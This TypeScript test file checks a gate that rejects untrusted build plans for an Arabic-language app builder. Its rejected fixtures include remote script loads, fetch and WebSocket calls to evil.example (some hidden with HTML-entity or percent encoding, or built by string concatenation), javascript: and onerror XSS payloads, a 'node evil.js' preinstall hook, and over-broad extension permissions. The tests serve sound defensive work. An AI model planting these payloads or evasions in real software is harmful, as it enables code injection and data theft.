import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { BUILD_KINDS } from '../../../packages/shared/src/buildMenu.js';
import { BuildMenuError } from '../grants.js';
import { kindPlanContract, parseUntrustedPlan } from '../planGate.js';

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..', '..', '..');

function rejected(raw: unknown, message: string): void {
  assert.throws(
    () => parseUntrustedPlan(raw),
    (error: unknown) => error instanceof BuildMenuError && error.message === message,
  );
}

test('each kind contract is Arabic and names no frozen host file', () => {
  for (const kind of BUILD_KINDS) {
    const contract = kindPlanContract(kind);
    assert.equal(contract.kind, kind);
    assert.match(contract.brief, /[\u0600-\u06FF]/);
    assert.match(contract.acceptance, /[\u0600-\u06FF]/);
    assert.match(contract.permissions, /[\u0600-\u06FF]/);
    assert.ok(contract.allowedFiles.length > 0);
    for (const file of contract.allowedFiles) {
      assert.equal(file.includes('package.json'), false);
      assert.equal(file.includes('vite.config'), false);
      assert.equal(file.includes('electron/'), false);
    }
  }
});

test('an untrusted plan cannot request a command, a frozen file, or a new capability', () => {
  const empty = parseUntrustedPlan({ kind: 'website', files: [] });
  assert.deepEqual(empty.files, []);
  const page = parseUntrustedPlan({
    kind: 'website',
    files: [
      { path: 'app/preview.html', content: '<p>مرحبا</p>' },
      { path: 'app/loam-website.json', content: '{"subtype":"store"}' },
    ],
  });
  assert.deepEqual(page.files.map((file) => file.path), ['app/preview.html', 'app/loam-website.json']);
  const manifest = JSON.stringify({ manifest_version: 3, name: 'notes', version: '1', permissions: ['storage'] });
  const chrome = parseUntrustedPlan({ kind: 'chrome-extension', files: [{ path: 'app/manifest.json', content: manifest }] });
  assert.equal(chrome.files.length, 1);
  const tuning = parseUntrustedPlan({ kind: 'game', files: [{ path: 'app/tuning.json', content: '{"speed":200,"gravity":700}' }] });
  parseUntrustedPlan({ kind: 'game', files: [{ path: 'app/index.html', content: '<canvas id="game"></canvas><script>var local=1;</script>' }] });
  assert.equal(tuning.files[0]?.path, 'app/tuning.json');

  rejected({ kind: 'website', files: [], command: 'npm ci' }, 'invalid_request');
  rejected({ kind: 'website', files: [{ path: 'app/package.json', content: '{"scripts":{"preinstall":"node evil.js"}}' }] }, 'invalid_request');
  rejected({ kind: 'website', files: [{ path: 'app/vite.config.ts', content: 'export default {}\n' }] }, 'invalid_request');
  rejected({ kind: 'desktop', files: [{ path: 'app/electron/main.cjs', content: 'require("child_process")' }] }, 'invalid_request');
  rejected({ kind: 'website', files: [{ path: '../package.json', content: '{}' }] }, 'unsafe_path');
  rejected({ kind: 'website', files: [{ path: 'app/preview.html', content: '<script src="https://evil.example/a.js"></script>' }] }, 'unsafe_path');
  rejected({ kind: 'website', files: [{ path: 'app/preview.html', content: '<script src="//evil.example/a.js"></script><script>local</script>' }] }, 'unsafe_path');
  rejected({ kind: 'website', files: [{ path: 'app/preview.html', content: '<img src="x" onerror="alert(1)"><script>local</script>' }] }, 'unsafe_path');
  rejected({ kind: 'website', files: [{ path: 'app/preview.html', content: '{"preinstall":"node evil.js"}' }] }, 'approval_required');
  rejected({
    kind: 'chrome-extension',
    files: [{ path: 'app/manifest.json', content: JSON.stringify({ permissions: ['debugger'], host_permissions: ['<all_urls>'] }) }],
  }, 'approval_required');
  rejected({
    kind: 'notebook',
    files: [{ path: 'app/notebook.ipynb', content: JSON.stringify({ cells: [{ source: 'pip install requests' }] }) }],
  }, 'approval_required');
  rejected({
    kind: 'notebook',
    files: [{ path: 'app/notebook.ipynb', content: JSON.stringify({ cells: [{ source: "pip.main(['install', 'requests'])" }] }) }],
  }, 'approval_required');
  rejected({
    kind: 'notebook',
    files: [{ path: 'app/notebook.ipynb', content: JSON.stringify({ cells: [{ source: "subprocess.check_call(['pip', 'install', 'requests'])" }] }) }],
  }, 'approval_required');
  rejected({ kind: 'automation', files: [{ path: 'app/preview.html', content: '{"send": true}' }] }, 'approval_required');
  rejected({ kind: 'desktop', files: [{ path: 'app/dist/index.html', content: 'require("child_process")' }] }, 'invalid_request');
  rejected({ kind: 'desktop', files: [{ path: 'app/dist/index.html', content: '<script src="//evil.example/a.js"></script>' }] }, 'unsafe_path');
  rejected({ kind: 'widget', files: [{ path: 'app/dist/index.html', content: '<a href="//evil.example">خروج</a>' }] }, 'unsafe_path');
  rejected({ kind: 'mobile', files: [{ path: 'app/simulation.html', content: '<script src="//evil.example/a.js"></script>' }] }, 'unsafe_path');
  parseUntrustedPlan({
    kind: 'desktop',
    files: [{ path: 'app/dist/index.html', content: '<link rel="stylesheet" href="./styles.css"><script type="module" src="./app.ts"></script>' }],
  });
  rejected({ kind: 'game', files: [{ path: 'app/index.html', content: '<script src="//evil.example/a.js"></script>' }] }, 'unsafe_path');
  parseUntrustedPlan({ kind: 'chrome-extension', files: [{ path: 'app/popup.html', content: '<h1>ملاحظة</h1><script src="popup.js"></script>' }] });
  rejected({ kind: 'safari-extension', files: [{ path: 'app/popup.html', content: '<script src="//evil.example/a.js"></script><script src="popup.js"></script>' }] }, 'unsafe_path');

  const local = [
    '<link rel="stylesheet" href="./styles.css"><script type="module" src="./app.ts"></script>',
    '<script type="module">import note from \'./notes.js\'; // local note',
    'fetch(\'./notes.js\');',
    'const n=1;</script>',
  ].join('');
  parseUntrustedPlan({ kind: 'desktop', files: [{ path: 'app/dist/index.html', content: local }] });
  rejected({ kind: 'desktop', files: [{ path: 'app/dist/index.html', content: 'require("child_process")' }] }, 'invalid_request');
  rejected({ kind: 'desktop', files: [{ path: 'app/dist/index.html', content: '<iframe src="//evil.example/"></iframe>' }] }, 'unsafe_path');
  rejected({ kind: 'desktop', files: [{ path: 'app/dist/index.html', content: '<script>fetch("//evil.example/a.js")</script>' }] }, 'unsafe_path');
  rejected({ kind: 'desktop', files: [{ path: 'app/dist/index.html', content: '<a href="javascript:alert(1)">x</a>' }] }, 'unsafe_path');
  rejected({ kind: 'desktop', files: [{ path: 'app/dist/index.html', content: '<img src="&#47;&#47;evil.example/a.png">' }] }, 'unsafe_path');
  rejected({ kind: 'desktop', files: [{ path: 'app/dist/index.html', content: '<a href="https&#58;//evil.example/a">x</a>' }] }, 'unsafe_path');
  rejected({ kind: 'widget', files: [{ path: 'app/dist/index.html', content: '<div style="background:url(//evil.example/a.png)"></div>' }] }, 'unsafe_path');
  rejected({ kind: 'mobile', files: [{ path: 'app/simulation.html', content: '<script>import("//cdn.example/a.js")</script>' }] }, 'unsafe_path');
  rejected({ kind: 'automation', files: [{ path: 'app/preview.html', content: '<meta http-equiv="refresh" content="0;url=//evil.example/">' }] }, 'unsafe_path');
  rejected({ kind: 'desktop', files: [{ path: 'app/dist/index.html', content: '<script>new WebSocket("wss://evil.example/live")</script>' }] }, 'unsafe_path');

  rejected({ kind: 'desktop', files: [{ path: 'app/dist/index.html', content: '<iframe src="http%3A%2F%2Fevil.example/"></iframe>' }] }, 'unsafe_path');
  rejected({ kind: 'widget', files: [{ path: 'app/dist/index.html', content: '<a href="https%3A%2F%2Fevil.example/a">خروج</a>' }] }, 'unsafe_path');
  rejected({ kind: 'mobile', files: [{ path: 'app/simulation.html', content: '<a href="javascript%3Aalert(1)">x</a>' }] }, 'unsafe_path');
  rejected({ kind: 'automation', files: [{ path: 'app/preview.html', content: '<script>fetch(\'http\'+\'://evil.example/a.js\')</script>' }] }, 'unsafe_path');
  rejected({ kind: 'desktop', files: [{ path: 'app/dist/index.html', content: '<div style="background:url(http%3a%2f%2fevil.example/a.png)"></div>' }] }, 'unsafe_path');
  rejected({ kind: 'widget', files: [{ path: 'app/dist/index.html', content: '<script>new WebSocket("wss" + "://evil.example/live")</script>' }] }, 'unsafe_path');
  rejected({ kind: 'mobile', files: [{ path: 'app/simulation.html', content: '<a href="javascript"+":alert(1)">x</a>' }] }, 'unsafe_path');
  rejected({ kind: 'automation', files: [{ path: 'app/preview.html', content: '<iframe src="http%253A%252F%252Fevil.example/"></iframe>' }] }, 'unsafe_path');
  parseUntrustedPlan({
    kind: 'desktop',
    files: [{ path: 'app/dist/index.html', content: '<p>هذه جملة عربية محلية: خصم 50% على الملاحظة.</p>' }],
  });

  const source = fs.readFileSync(path.join(root, 'src', 'buildMenu', 'planGate.ts'), 'utf8');
  assert.equal(source.includes("from 'node:child_process'"), false);
  assert.equal(source.includes('writeFile'), false);
  assert.equal(source.includes('spawn('), false);
  const route = fs.readFileSync(path.join(root, 'src', 'server', 'routes', 'buildMenu.ts'), 'utf8');
  assert.match(route, /generation needs a model provider/);
});
